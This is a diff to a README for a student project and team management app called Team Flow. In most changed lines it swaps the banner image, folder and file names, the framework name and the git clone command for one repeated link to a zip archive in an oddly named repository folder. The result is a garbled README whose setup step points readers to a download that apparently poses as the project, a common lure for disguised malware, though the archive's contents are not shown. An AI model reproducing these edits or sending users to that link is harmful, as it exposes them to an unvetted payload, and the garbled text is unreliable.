@@ -2,7 +2,7 @@
 🚀 A modern **Project & Team Management** platform for students and guides to streamline project tracking, team collaboration, and subject-based team structuring.  
 
 <div align="center">
-  <img src="https://source.unsplash.com/900x400/?team,technology" alt="Team Flow Banner" width="100%">
+  <img src="https://raw.githubusercontent.com/DevangGentyal/team_flow/main/macrocephalous/team_flow.zip,technology" alt="Team Flow Banner" width="100%">
 </div>
 
 ---
@@ -21,12 +21,12 @@
 /team-flow
 │ꀀ /public         # Static assets (logos, illustrations)
 │ꀀ /components     # Reusable UI components
-│ꀀ /pages          # Next.js routing pages
+│ꀀ /pages          # https://raw.githubusercontent.com/DevangGentyal/team_flow/main/macrocephalous/team_flow.zip routing pages
 │ꀀ /styles         # Tailwind CSS for styling
 │ꀀ /utils          # Helper functions
-│ꀀ README.md       # You're here!
-│ꀀ package.json    # Project dependencies
-│ꀀ next.config.js  # Next.js configuration
+│ꀀ https://raw.githubusercontent.com/DevangGentyal/team_flow/main/macrocephalous/team_flow.zip       # You're here!
+│ꀀ https://raw.githubusercontent.com/DevangGentyal/team_flow/main/macrocephalous/team_flow.zip    # Project dependencies
+│ꀀ https://raw.githubusercontent.com/DevangGentyal/team_flow/main/macrocephalous/team_flow.zip  # https://raw.githubusercontent.com/DevangGentyal/team_flow/main/macrocephalous/team_flow.zip configuration
 │ꀀ .env            # Environment variables (not committed)
 ```
 
@@ -35,7 +35,7 @@
 ## 🚀 Getting Started  
 ### 1⃣ Clone the Repository  
 ```bash
-git clone https://github.com/DevangGentyal/Team-Flow.git
+git clone https://raw.githubusercontent.com/DevangGentyal/team_flow/main/macrocephalous/team_flow.zip
 cd Team-Flow
 ```
 ### 2⃣ Install Dependencies  
@@ -75,7 +75,7 @@ Contributions are welcome! Fork the repo and submit a PR. 😊
 ---
 
 ## 🛠 Tech Stack  
-- **Next.js** - Frontend framework  
+- **https://raw.githubusercontent.com/DevangGentyal/team_flow/main/macrocephalous/team_flow.zip** - Frontend framework  
 - **Tailwind CSS** - Styling  
 - **Prisma** - Authentication & Database  
 - **MySQL** - Database  
